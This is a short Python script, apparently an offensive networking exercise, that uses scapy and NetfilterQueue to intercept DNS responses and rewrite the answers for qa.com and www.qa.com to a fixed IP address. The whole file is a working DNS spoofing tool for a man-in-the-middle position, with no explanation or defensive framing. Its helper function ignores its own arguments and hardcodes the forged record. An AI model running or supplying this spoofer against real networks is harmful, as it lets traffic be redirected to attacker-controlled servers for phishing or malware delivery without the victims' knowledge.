from scapy.all import *
from netfilterqueue import NetfilterQueue

dns = {
    "qa.com.": "139.59.163.130",
    "www.qa.com.": "139.59.163.130",
}


def spoof_dns(packet, rrname, rdate):
    packet[DNS].an = DNSRR(rrname="qa.com.", rdata="139.59.163.130")
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet


def modify(packet):
    pkt = IP(packet.get_payload())
    if pkt.haslayer(DNSRR):
        qname = pkt[DNSQR].qname.decode()
        if qname in dns:
            pkt = spoof_dns(pkt, qname, dns[qname])
        packet.set_payload(bytes(pkt))
    packet.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, modify)
try:
    print("[*] waiting for data")
    nfqueue.run()
except KeyboardInterrupt:
    pass
